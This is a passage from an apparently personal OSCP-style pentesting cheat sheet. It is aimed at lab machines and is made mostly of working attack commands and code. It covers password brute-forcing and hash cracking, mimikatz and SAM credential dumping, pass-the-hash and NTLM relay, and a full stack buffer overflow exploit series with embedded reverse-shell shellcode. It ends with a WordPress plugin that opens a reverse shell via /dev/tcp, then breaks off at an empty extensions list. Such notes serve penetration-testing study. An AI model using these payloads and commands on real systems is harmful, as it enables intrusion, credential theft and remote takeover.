hydra -l root@localhost -P wordlist.txt &lt;IP&gt; http-post-form "&lt;/otrs/index.pl&gt;:Action=Login&amp;RequestedURL=&amp;Lang=en&amp;TimeOffset=300&amp;User=^USER^&amp;Password=^PASS^:Login Failed" -V

hydra -L ../usernames.txt -P /root/scripts/wordlist/CeWL/pw.txt 10.11.1.39 http-post-form "&lt;/otrs/index.pl&gt;:Action=Login&amp;RequestedURL=&amp;Lang=en&amp;TimeOffset=-120&amp;User=^USER^&amp;Password=^PASS^:F=Login failed" -I

# Creating a Wordlist with Cewl
cewl www.testwebsite.com -m 6 -w pass.txt # -m is min 6 length word

# Creating wordlist + Adding a rule in Johntheripper
sudo nano /etc/john/john.conf

-&gt; Add this rule in last, Add two numbers to the end of each password
$[0-9]$[0-9]

# Took the wordlist, added rules, and outputted in mutated.txt
john --wordlist=pass.txt --rules --stdout &gt; mutated.txt 
</code></pre>
<h3 id="hash-finder"><a class="header" href="#hash-finder">Hash Finder</a></h3>
<pre><code>hashid &lt;hash value&gt;
hash-identifier
haiti 'hash' # Gives hashcat ID as well
</code></pre>
<h3 id="hashcat"><a class="header" href="#hashcat">Hashcat</a></h3>
<pre><code>hashcat -m &lt;ID&gt; hash /usr/share/wordlists/rockyou.txt --force # Google hash ID
hashcat -a 0 &lt;hash.txt&gt; /usr/share/wordlists/rockyou.txt —show
</code></pre>
<h3 id="john-the-ripper-windows-hashes"><a class="header" href="#john-the-ripper-windows-hashes">John the Ripper (Windows hashes)</a></h3>
<pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT # Rules
</code></pre>
<h3 id="john-the-ripper-linux-hashes"><a class="header" href="#john-the-ripper-linux-hashes">John the Ripper (Linux hashes)</a></h3>
<pre><code>-&gt; First combine shadow and password and use a tool called unshadow.
unshadow passwd-file.txt shadow-file.txt &gt; unshadowed.txt

john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
PDF or ZIP


unshadow passwd shadow &gt; unshadow
john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt unshadow



</code></pre>
<h3 id="cracking-the-hash-of-pdf"><a class="header" href="#cracking-the-hash-of-pdf">Cracking the hash of PDF</a></h3>
<pre><code>pdf2john test.pdf &gt; hash 
OR
zip2john test.zip &gt; hash
</code></pre>
<h3 id="cracking-the-hash-that-was-found"><a class="header" href="#cracking-the-hash-that-was-found">Cracking the hash that was found</a></h3>
<pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash
</code></pre>
<h3 id="medusa"><a class="header" href="#medusa">Medusa</a></h3>
<pre><code>medusa -h &lt;IP&gt; -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
</code></pre>
<h3 id="tomcat-get"><a class="header" href="#tomcat-get">Tomcat GET:</a></h3>
<pre><code>hydra -L /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt http-get://&lt;IP&gt;:8080/manager/html
</code></pre>
<h3 id="rdp"><a class="header" href="#rdp">RDP</a></h3>
<pre><code>crowbar -b rdp -s &lt;IP&gt; -u &lt;admin&gt; -C rockyou.txt -n 1
</code></pre>
<h3 id="evil-winrm"><a class="header" href="#evil-winrm">Evil-winrm</a></h3>
<pre><code>crackmapexec winrm &lt;IP&gt; -d &lt;domain&gt; -u users.txt -p password.txt
</code></pre>
<h3 id="ssh-1"><a class="header" href="#ssh-1">SSH</a></h3>
<pre><code>hydra -l &lt;user&gt; -P /usr/share/wordlists/rokyou.txt &lt;ssh&gt;://&lt;IP&gt; -s &lt;port&gt;
hydra -l &lt;user&gt; -P /usr/share/wordlists/metasploit/unix_passwords.txt &lt;IP&gt; ssh -t 4 -V

For SSH, if you can get the id_rsa file and passphrase, use that to login:

chmod 600 id_rsa
ssh -i id_rsa -p 2222 dave@192.168.50.201

or crack the password first:
ssh2john id_rsa &gt; ssh.hash
cat ssh.hash //remove first line
hashcat -h | grep -i "ssh"
//Make a modified rule list of possible
hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
//If hashcat doesn't work, try add rule to JtR
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule &gt;&gt; /etc/john/john.conf'
john --wordlist=ssh.passwords --rules=sshRules ssh.hash


</code></pre>
<h3 id="http-get"><a class="header" href="#http-get">HTTP-GET</a></h3>
<pre><code>hydra -l &lt;user&gt; -P /usr/share/wordlists/rockyou.txt http-get://&lt;IP&gt;
</code></pre>
<h3 id="http-post"><a class="header" href="#http-post">HTTP-POST</a></h3>
<pre><code>hydra &lt;IP&gt; http-form-post &lt;"/form/frontpage.php:user=admin&amp;pass=^PASS^:INVALID LOGIN"&gt; -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
</code></pre>
<h3 id="ftp-2"><a class="header" href="#ftp-2">FTP</a></h3>
<pre><code>hydra -l &lt;user&gt; -P /usr/share/wordlists/rockyou.txt -vV &lt;IP&gt; ftp
</code></pre>
<h3 id="zip"><a class="header" href="#zip">ZIP</a></h3>
<pre><code>fcrackzip -v -u -b -D -p /usr/share/wordlists/rockyou.txt secrets.zip
</code></pre>
<h3 id="unshadow"><a class="header" href="#unshadow">Unshadow</a></h3>
<pre><code>/etc/shadow + /etc/passwd
# Grab both and do the following command
unshadow &lt;passwd file&gt; &lt;shadow file&gt; &gt; unshadowed.txt
</code></pre>
<h3 id="wordpress"><a class="header" href="#wordpress">WordPress</a></h3>
<pre><code>wpscan --url &lt;IP&gt; -U users.txt -P pass.txt
wpscan --url http://test.com/
</code></pre>
<h3 id="asc"><a class="header" href="#asc">ASC</a></h3>
<pre><code>gpg2john tryhackme.asc &gt; hash
john hash -w=/usr/share/wordlists/rockyou.txt
gpg —import tryhackme.asc # Enter the passphrase
gpg —decrypt credentials.pgp
</code></pre>
<h3 id="keeppass"><a class="header" href="#keeppass">KeepPass</a></h3>
<pre><code>For password managers like KeepPass, try to get the database to extract hashes:

ls -la Database.kdbx
ls -la Database.kdbx

keepass2john Database.kdbx &gt; keepass.hash
or
keepass2john Database.kdb | grep -o "$keepass$.*" &gt;  CrackThis.hash

cat keepass.hash
hashcat --help | grep -i "KeePass"
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

Maybe try this wordlist to be faster:

/usr/share/wordlists/fasttrack.txt

</code></pre>
<h3 id="ntlm"><a class="header" href="#ntlm">NTLM</a></h3>
<pre><code>NTLM
---
Get-LocalUser
.\mimikatz.exe // As admin
privilege::debug
token::elevate
lsadump::sam
//Get hash
hashcat --help | grep -i "ntlm"
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

or pass it:
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

Net-NTLM-v2
---
You need a revers shell on victim first:
nc 192.168.50.211 4444
net user paul
sudo responder -I tun0 //basically setups a smb server
try to connect to it from victim:
dir \\192.168.119.2\test
That will gen a hash you can crack:
hashcat --help | grep -i "ntlm"
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
*Note: Might see a web upload, so capture it and change file name to the responder smb listner, i.e. \\\\Kali_IP\\test*

For the relay do this instead of responder:

impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."


Another trick to get hashes on responder is to use ntlm-theft to generate things for a user to click:
https://github.com/Greenwolf/ntlm_theft
 - python ntlm_theft.py -g all -s 10.10.14.6 -f 0xdf
 - run responder and upload these files to a folder on victim machine and wait a couple of minutes








Mimikatz One-Liner:

.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "token::elevate" "lsadump::sam /system:C:\TEMP\SYSTEM /sam:C:\TEMP\SAM sam.hiv security.hiv system.hiv" "lsadump::cache" "sekurlsa::ekeys" "exit"



</code></pre>
<h3 id="mscash"><a class="header" href="#mscash">MSCASH</a></h3>
<pre><code>Secretsdump:

reg.exe save hklm\sam c:\temp\sam.save

reg.exe save hklm\security c:\temp\security.save

reg.exe save hklm\system c:\temp\system.save

secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

Mimikatz:

lsadump::cache

To crack mscache with hashcat, it should be in the following format:
$DCC2$10240#username#hash

Below shows the original output format from cachedump and the format accepted by hashcat:

echo ; cat hashes.txt ; echo ; cut -d ":" -f 2 hashes.txt

hashcat -m2100 '$DCC2$10240#spot#3407de6ff2f044ab21711a394d85f3b8' /usr/share/wordlists/rockyou.txt --force --potfile-disable

</code></pre>
<h3 id="python-md5-custom-script"><a class="header" href="#python-md5-custom-script">Python MD5 Custom Script</a></h3>
<p>https://blog.yunolay.com/?p=229</p>
<pre><code>	This was from VulnLab Sync box, required a custom script based on the way the passwords were hashed with salt and username:



import hashlib
import threading
from queue import Queue

secure = "6c4972f3717a5e881e282ad3105de01e"

# Username
admin_username = "admin"
triss_username = "triss"

# Stored hash
admin_hash = "7658a2741c9df3a97c819584db6e6b3c"
triss_hash = "a0de4d7f81676c3ea9eabcadfd2536f6"

def check_password(password):
    triss_hash_str = f"{secure}|{triss_username}|{password}"
    admin_hash_str = f"{secure}|{admin_username}|{password}"

    triss_hash_obj = hashlib.md5(triss_hash_str.encode("ISO-8859-1")).hexdigest()
    admin_hash_obj = hashlib.md5(admin_hash_str.encode("ISO-8859-1")).hexdigest()

    print("[-] Trying triss password: " + password + " with hash str: " + triss_hash_str)

    if triss_hash_obj == triss_hash:
        print(f"Found password for {triss_username}: {password}")
        continue_search = input("Continue searching? (y/n): ")
        if continue_search.lower() != "y":
            return True

    print("[-] Trying admin password: " + password + " with hash str: " + admin_hash_str)

    if admin_hash_obj == admin_hash:
        print(f"Found password for admin: {password}")
        continue_search = input("Continue searching? (y/n): ")
        if continue_search.lower() != "y":
            return True

with open("/usr/share/wordlists/rockyou.txt", "r", encoding="ISO-8859-1") as f:
    for line in f:
        password = line.rstrip('\n')
        password_queue = Queue()
        if check_password(password):
            break

def worker():
    while not password_queue.empty():
        password = password_queue.get()
        if check_password(password):
            break
        password_queue.task_done()

# Number of threads
num_threads = 50

# Create and start worker threads
threads = []
for i in range(num_threads):
    thread = threading.Thread(target=worker)
    thread.start()
    threads.append(thread)

# Wait for all threads to finish
for thread in threads:
    thread.join()
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="buffer-overflow"><a class="header" href="#buffer-overflow">Buffer Overflow</a></h2>
<h3 id="links-5"><a class="header" href="#links-5">Links</a></h3>
<ul>
<li><a href="obsidian://open?vault=Obsidian%20Vault&amp;file=OSCP%2FRandom%20Notes%2FTib3rius%2FBuffer%20Overflow">Tib3rius</a></li>
<li><a href="https://github.com/justinsteven/dostackbufferoverflowgood/blob/master/dostackbufferoverflowgood_tutorial.pdf">Justin Steve BufferOverflow</a></li>
<li><a href="https://www.save-editor.com/tools/wse_hex.html">Convert Little Endian</a></li>
<li><a href="https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst">Tib3rius BufferOverflow Github</a></li>
<li><a href="https://github.com/3isenHeiM/OSCP-BoF">3isenHeim BufferOverflow GitHub</a></li>
</ul>
<h3 id="general-steps"><a class="header" href="#general-steps">General Steps</a></h3>
<pre><code>The Stack

|-------------------------------------------------|
|          ESP (Extended Stack Pointer)           |
|-------------------------------------------------|
|                 Buffer Space                    |
|-------------------------------------------------|
|          EBP (Extended Base Pointer)            |
|-------------------------------------------------|
|EIP (Extended Instruction Pointer)/Return Address|
|-------------------------------------------------|

The general flow of a standard stack-based buffer overflow is fairly straightforward. The exploit will: 
1. Create a large buffer to trigger the overflow. 
2. Take control of EIP by overwriting a return address on the stack, padding the large buffer with an appropriate offset. 
3. Include a chosen payload in the buffer prepended by an optional NOP572 sled. 
4. Choose a correct return address instruction such as JMP ESP (or a different register) to redirect the execution flow to the payload.

*Bad characters are ASCII or UNICODE characters that break the application when included in the payload because they might be interpreted as control characters.573 For example, the null-byte “\x00” is often interpreted as a string terminator and, if inserted in the payload, could prematurely truncate the attack buffer.*


In Immunity Debugger:

Step 1: !mona config -set workingfolder c:\mona\%p

Step 2: Run 1_Trigger.py with app running, should crash it
Step 3: msf-pattern_create -l 2500, copy into offset script
Step 4: Run 2_FindOffset.py, should crash again.
Step 5: !mona findmsp or msf-pattern_offset -q 386F4337 to Get EIP/ESP addresses
Step 6: Plug in offset, run, confirm AAAAA on EIP by running #3 Script
Step 7: !mona bytearray or CreateInitialBadChars.py //Don't necessarily need this?

Step 7.5: Run #4 script then copy badchar_test.bin to Win c: drive
Step 8: !mona bytearray –cpb “\x00\x0a” //This or the badchar_test.bin created by script
Step 9: !mona compare -a esp -f C:\mona\chatserver\bytearray.bin
//Basically, after 9 you gotta find the next barchar, readd to the #4 script, rerun until it says no more bad charts


Step 9.5: Use !mona modules to find a vulnerable file
Step 9.6: Also use !mona find -s "\xff\xe4" -m essfunc.dll #This is hex for JMP ESP
Step 10: !mona jmp -r esp -cpb "\x00\x16\x2f\xf4\xfd"
Step 10.5, Go to the log data, it should show jump addresses.

Step 11: Run #7 w/shell code below. SCripts #5 and #6 are for comfirming the JMP address and Shell execution with calculator



Shellcode:

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.150.132 LPORT=4444 \
-f py -b '\x00\x0A' -e x86/shikata_ga_nai --var-name shellcode


msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.150.132 LPORT=4444 EXITFUNC=thread -b "\x00" -f c


msfvenom -p windows/shell_reverse_tcp LHOST=192.168.150.132 LPORT=4444 EXITFUNC=thread -b "\x00" -f c

</code></pre>
<h3 id="buffer-skeleton-program"><a class="header" href="#buffer-skeleton-program">Buffer Skeleton Program</a></h3>
<pre><code>Buffer Over flow using Tib3rius Notes

# Buffer Skeleton Script:

#!/usr/bin/env python2
import socket
#import struct

ip = "192.168.17.133"
port = 31337

#ptr_jmp_esp = 0x080414C3
#bufflen = 1024

prefix = ""
offset = 146
overflow = "A" * offset
#retn = struct.pack("&lt;I", ptr_jmp_esp) 
retn = "\xC3\x14\x04\x08"
padding = "\x90" * 16
#padding = "\x83\xec\x10"
payload = ("Shell code here...")

postfix = ""
#postfix = "D" * (offset - len(bufflen))


buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")



</code></pre>
<h3 id="parameters-file"><a class="header" href="#parameters-file">Parameters File</a></h3>
<pre><code># PARAMETERS.py
# This is the files with all the variables
# This has been designed for the OSCP buffer overflow machine

RHOST = "192.168.150.133"
RPORT = 9999

# Total length of the buffer to send
buf_totlen = 2500

# Offset at which the EIP is overwritten
offset_eip = 2003

# Offset at which the ESP is overwritten
offset_esp = 2007

# Badchars sequence, comma-separated
badchars = [0x00]
# badchars = [0x00, 0x04, 0x05, 0xA2, 0xA3, 0xAC, 0xAD, 0xC0, 0xC1, 0xEF, 0xF0]

# Generate the string
badchar_sequence = bytes(c for c in range(256) if c not in badchars)

# Address of the JMP ESP operation
ptr_jmp_esp = 0x625011af

# To avoid setting a nop sled
sub_esp_10 = b"\x83\xec\x10"


</code></pre>
<h3 id="create-bad-chars-file"><a class="header" href="#create-bad-chars-file">Create Bad Chars File</a></h3>
<pre><code>#!/usr/bin/env python
from __future__ import print_function

for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')

print()

</code></pre>
<h3 id="quasi-auto-fuzzer"><a class="header" href="#quasi-auto-fuzzer">Quasi Auto Fuzzer</a></h3>
<pre><code>
# Fuzzer.py

#!/usr/bin/python
import sys, socket
from time import sleep
from PARAMETERS import RHOST, RPORT

buffer = "A" * 100

while True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((RHOST, RPORT))
		
		#For Vuln Server (('TRUN /.:/'' + buffer))
		s.send(('TRUN /.:/' + buffer))
		s.close()
		sleep(1)
		buffer = buffer + "A"*100
	except:
		print "Fuzzing crashed at %s bytes" % str(len(buffer))
		sys.exit()


</code></pre>
<h3 id="tryhackme-fuzzer"><a class="header" href="#tryhackme-fuzzer">TryHackMe Fuzzer</a></h3>
<pre><code>#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.84.48"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)


</code></pre>
<h3 id="tryhackme-exploit-code"><a class="header" href="#tryhackme-exploit-code">TryHackMe Exploit Code</a></h3>
<pre><code>import socket

ip = "10.10.84.48"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")


</code></pre>
<h3 id="1-trigger-bug"><a class="header" href="#1-trigger-bug">1 Trigger Bug</a></h3>
<pre><code>
 #!/usr/bin/env python2
import socket
from PARAMETERS import RHOST, RPORT
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf = ""
buf += "A"*1024
buf += "\n"

s.send(buf)



</code></pre>
<h3 id="2-find-offset"><a class="header" href="#2-find-offset">2 Find Offset</a></h3>
<pre><code>#!/usr/bin/env python2

#msf-pattern_create -l 1024
#msf-pattern_offset -q 39654138
#!mona findmsp

from PARAMETERS import RHOST, RPORT

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
buf = ""
buf += ("Put Pattern here")
buf += "\n"

#Trun is just for vuln server
s.send('TRUN /.:/'+buf)



</code></pre>
<h3 id="3-confirm-offset"><a class="header" href="#3-confirm-offset">3 Confirm Offset</a></h3>
<pre><code>#!/usr/bin/env python2
import socket

from PARAMETERS import RHOST, RPORT, offset_eip, buf_totlen

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

#buf_totlen = 1024
#offset_srp = 146

buf = ""
buf += "A"*(offset_eip - len(buf)) # padding
buf += "BBBB" # SRP overwrite
buf += "CCCC" # ESP should end up pointing here
buf += "D"*(buf_totlen - len(buf)) # trailing padding
buf += "\n"

s.send('TRUN /.:/'+buf)


</code></pre>
<h3 id="4-find-bad-chars"><a class="header" href="#4-find-bad-chars">4 Find Bad Chars</a></h3>
<pre><code>
#!/usr/bin/env python2



import socket

from PARAMETERS import RHOST, RPORT, offset_eip, buf_totlen, badchars

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

badchar_test = "" # start with an empty string
#badchars = [0x00] # we've reasoned that these are definitely bad
#badchars = []
# generate the string
for i in range(0x00, 0xFF+1): # range(0x00, 0xFF) only returns up to 0xFE
	if i not in badchars: # skip the badchars
		badchar_test += chr(i) # append each non-badchar char to the string

# open a file for writing ("w") the string as binary ("b") data
with open("badchar_test.bin", "wb") as f:
	f.write(badchar_test)

#buf_totlen = 1024
#offset_srp = 146

buf = ""
buf += "A"*(offset_eip - len(buf)) # padding
buf += "BBBB" # SRP overwrite
buf += badchar_test # ESP points here
buf += "D"*(buf_totlen - len(buf)) # trailing padding
buf += "\n"

s.send('TRUN /.:/'+buf)


</code></pre>
<h3 id="5-the-jmp"><a class="header" href="#5-the-jmp">5 The JMP</a></h3>
<pre><code>
#!/usr/bin/env python2
import socket
import struct

from PARAMETERS import RHOST, RPORT, offset_eip, buf_totlen, ptr_jmp_esp

#!mona jmp -r esp -cpb "\x00\x0A"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

#buf_totlen = 1024
#offset_srp = 146

#ptr_jmp_esp = 0x080414C3

buf = ""
buf += "A"*(offset_eip - len(buf)) # padding
buf += struct.pack("&lt;I", ptr_jmp_esp) # SRP overwrite
buf += "\xCC\xCC\xCC\xCC" # ESP points here
buf += "D"*(buf_totlen - len(buf)) # trailing padding
buf += "\n"

s.send('TRUN /.:/'+buf)


</code></pre>
<h3 id="6-pop-calc"><a class="header" href="#6-pop-calc">6 Pop Calc</a></h3>
<pre><code>#!/usr/bin/env python2
import socket
import struct

from PARAMETERS import RHOST, RPORT, offset_eip, buf_totlen, ptr_jmp_esp, sub_esp_10

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

#buf_totlen = 1024
#offset_srp = 146

#ptr_jmp_esp = 0x080414C3

#sub_esp_10 = "\x83\xec\x10"
#or padding = "\x90" * 16
shellcode_calc =  b""
shellcode_calc += b"\xda\xc6\xd9\x74\x24\xf4\x5e\x31\xc9"
shellcode_calc += b"\xbf\x60\x64\x3e\x98\xb1\x31\x83\xc6"
shellcode_calc += b"\x04\x31\x7e\x14\x03\x7e\x74\x86\xcb"
shellcode_calc += b"\x64\x9c\xc4\x34\x95\x5c\xa9\xbd\x70"
shellcode_calc += b"\x6d\xe9\xda\xf1\xdd\xd9\xa9\x54\xd1"
shellcode_calc += b"\x92\xfc\x4c\x62\xd6\x28\x62\xc3\x5d"
shellcode_calc += b"\x0f\x4d\xd4\xce\x73\xcc\x56\x0d\xa0"
shellcode_calc += b"\x2e\x67\xde\xb5\x2f\xa0\x03\x37\x7d"
shellcode_calc += b"\x79\x4f\xea\x92\x0e\x05\x37\x18\x5c"
shellcode_calc += b"\x8b\x3f\xfd\x14\xaa\x6e\x50\x2f\xf5"
shellcode_calc += b"\xb0\x52\xfc\x8d\xf8\x4c\xe1\xa8\xb3"
shellcode_calc += b"\xe7\xd1\x47\x42\x2e\x28\xa7\xe9\x0f"
shellcode_calc += b"\x85\x5a\xf3\x48\x21\x85\x86\xa0\x52"
shellcode_calc += b"\x38\x91\x76\x29\xe6\x14\x6d\x89\x6d"
shellcode_calc += b"\x8e\x49\x28\xa1\x49\x19\x26\x0e\x1d"
shellcode_calc += b"\x45\x2a\x91\xf2\xfd\x56\x1a\xf5\xd1"
shellcode_calc += b"\xdf\x58\xd2\xf5\x84\x3b\x7b\xaf\x60"
shellcode_calc += b"\xed\x84\xaf\xcb\x52\x21\xbb\xe1\x87"
shellcode_calc += b"\x58\xe6\x6f\x59\xee\x9c\xdd\x59\xf0"
shellcode_calc += b"\x9e\x71\x32\xc1\x15\x1e\x45\xde\xff"
shellcode_calc += b"\x5b\xa9\x3c\x2a\x91\x42\x99\xbf\x18"
shellcode_calc += b"\x0f\x1a\x6a\x5e\x36\x99\x9f\x1e\xcd"
shellcode_calc += b"\x81\xd5\x1b\x89\x05\x05\x51\x82\xe3"
shellcode_calc += b"\x29\xc6\xa3\x21\x4a\x89\x37\xa9\xa3"
shellcode_calc += b"\x2c\xb0\x48\xbc"


buf = ""
buf += "A"*(offset_eip - len(buf)) # padding
buf += struct.pack("&lt;I", ptr_jmp_esp) # SRP overwrite
buf += sub_esp_10 # ESP points here
buf += shellcode_calc
buf += "D"*(buf_totlen - len(buf)) # trailing padding
buf += "\n"

s.send(buf)



</code></pre>
<h3 id="7-pop-shell"><a class="header" href="#7-pop-shell">7 Pop Shell</a></h3>
<pre><code>
#!/usr/bin/env python2
import socket
import struct

from PARAMETERS import RHOST, RPORT, offset_eip, buf_totlen, ptr_jmp_esp, sub_esp_10

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

#buf_totlen = 1024
#offset_srp = 146

#ptr_jmp_esp = 0x080414C3

#sub_esp_10 = "\x83\xec\x10"
#or padding = "\x90" * 16
shellcode =  ("\xbf\x50\x74\xec\x7c\xdb\xcb\xd9\x74\x24\xf4\x5e\x2b\xc9"
"\xb1\x52\x31\x7e\x12\x03\x7e\x12\x83\x96\x70\x0e\x89\xea"
"\x91\x4c\x72\x12\x62\x31\xfa\xf7\x53\x71\x98\x7c\xc3\x41"
"\xea\xd0\xe8\x2a\xbe\xc0\x7b\x5e\x17\xe7\xcc\xd5\x41\xc6"
"\xcd\x46\xb1\x49\x4e\x95\xe6\xa9\x6f\x56\xfb\xa8\xa8\x8b"
"\xf6\xf8\x61\xc7\xa5\xec\x06\x9d\x75\x87\x55\x33\xfe\x74"
"\x2d\x32\x2f\x2b\x25\x6d\xef\xca\xea\x05\xa6\xd4\xef\x20"
"\x70\x6f\xdb\xdf\x83\xb9\x15\x1f\x2f\x84\x99\xd2\x31\xc1"
"\x1e\x0d\x44\x3b\x5d\xb0\x5f\xf8\x1f\x6e\xd5\x1a\x87\xe5"
"\x4d\xc6\x39\x29\x0b\x8d\x36\x86\x5f\xc9\x5a\x19\xb3\x62"
"\x66\x92\x32\xa4\xee\xe0\x10\x60\xaa\xb3\x39\x31\x16\x15"
"\x45\x21\xf9\xca\xe3\x2a\x14\x1e\x9e\x71\x71\xd3\x93\x89"
"\x81\x7b\xa3\xfa\xb3\x24\x1f\x94\xff\xad\xb9\x63\xff\x87"
"\x7e\xfb\xfe\x27\x7f\xd2\xc4\x7c\x2f\x4c\xec\xfc\xa4\x8c"
"\x11\x29\x6a\xdc\xbd\x82\xcb\x8c\x7d\x73\xa4\xc6\x71\xac"
"\xd4\xe9\x5b\xc5\x7f\x10\x0c\x2a\xd7\x8c\x48\xc2\x2a\xb0"
"\x41\x4f\xa2\x56\x0b\x7f\xe2\xc1\xa4\xe6\xaf\x99\x55\xe6"
"\x65\xe4\x56\x6c\x8a\x19\x18\x85\xe7\x09\xcd\x65\xb2\x73"
"\x58\x79\x68\x1b\x06\xe8\xf7\xdb\x41\x11\xa0\x8c\x06\xe7"
"\xb9\x58\xbb\x5e\x10\x7e\x46\x06\x5b\x3a\x9d\xfb\x62\xc3"
"\x50\x47\x41\xd3\xac\x48\xcd\x87\x60\x1f\x9b\x71\xc7\xc9"
"\x6d\x2b\x91\xa6\x27\xbb\x64\x85\xf7\xbd\x68\xc0\x81\x21"
"\xd8\xbd\xd7\x5e\xd5\x29\xd0\x27\x0b\xca\x1f\xf2\x8f\xea"
"\xfd\xd6\xe5\x82\x5b\xb3\x47\xcf\x5b\x6e\x8b\xf6\xdf\x9a"
"\x74\x0d\xff\xef\x71\x49\x47\x1c\x08\xc2\x22\x22\xbf\xe3"
"\x66")





buf = ""
buf += "A"*(offset_eip - len(buf)) # padding
buf += struct.pack("&lt;I", ptr_jmp_esp) # SRP overwrite
buf += sub_esp_10 # ESP points here
buf += shellcode
buf += "D"*(buf_totlen - len(buf)) # trailing padding
buf += "\n"

s.send('TRUN /.:/'+buf)



</code></pre>
<h3 id="smash-the-stack-notes"><a class="header" href="#smash-the-stack-notes">Smash The Stack Notes</a></h3>
<pre><code>
void function(int a, int b, int c) {   char buffer1[5];   char buffer2[10];   int *ret;   ret = buffer1 + 12;   (*ret) += 8; } void main() {  int x;  x = 0;  function(1,2,3);  x = 1;  printf("%d\n",x); }


</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="1-wordpress"><a class="header" href="#1-wordpress"># 1 Wordpress</a></h1>
<hr />
<h2 id="wpscan"><a class="header" href="#wpscan">wpscan</a></h2>
<pre><code>  wpscan --url http://sandbox.local  --enumerate ap,at,cb,dbe -o sandbox.out
</code></pre>
<pre><code>  ./wpscan –url http://IP/ –enumerate p
</code></pre>
<p>Sometimes it is convenient to use the aggressive mode of wpscan</p>
<h2 id="wordpress-password-cracker"><a class="header" href="#wordpress-password-cracker">wordpress password cracker</a></h2>
<p>https://github.com/MrSqar-Ye/wpCrack.git</p>
<h2 id="wordpress-reverse-shell-admin-panel"><a class="header" href="#wordpress-reverse-shell-admin-panel">wordpress reverse shell admin panel</a></h2>
<ol>
<li>create php code</li>
</ol>
<pre><code>&lt;?php

exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.86.99/443 0&gt;&amp;1'");
?&gt;
</code></pre>
<ol>
<li>zip the php</li>
<li>upload the zip as plugin</li>
<li>activate plugin</li>
</ol>
<h1 id="2-joomla"><a class="header" href="#2-joomla">2 Joomla</a></h1>
<hr />
<p>ip/administrator/manifests/files/joomla.xml &lt;- te da la version</p>
<h2 id="joomscan"><a class="header" href="#joomscan">joomscan</a></h2>
<pre><code>joomscan -ec -u  http://curling.htb
</code></pre>
<h1 id="3-drupal"><a class="header" href="#3-drupal">3 DRUPAL</a></h1>
<hr />
<p>https://github.com/dreadlocked/Drupalgeddon2</p>
<pre><code>droopescan scan drupal -u 10.10.10.102:80 
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="file-uploads"><a class="header" href="#file-uploads">File Uploads</a></h2>
<p>Only refer Extensions section below for OSCP File upload Bypassing</p>
<h3 id="links-6"><a class="header" href="#links-6">Links</a></h3>
<ul>
<li><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/bypass_image_upload.html">Total OSCP Guide File Uploads</a></li>
</ul>
<h3 id="extensions"><a class="header" href="#extensions">EXTENSIONS</a></h3>
<ul>
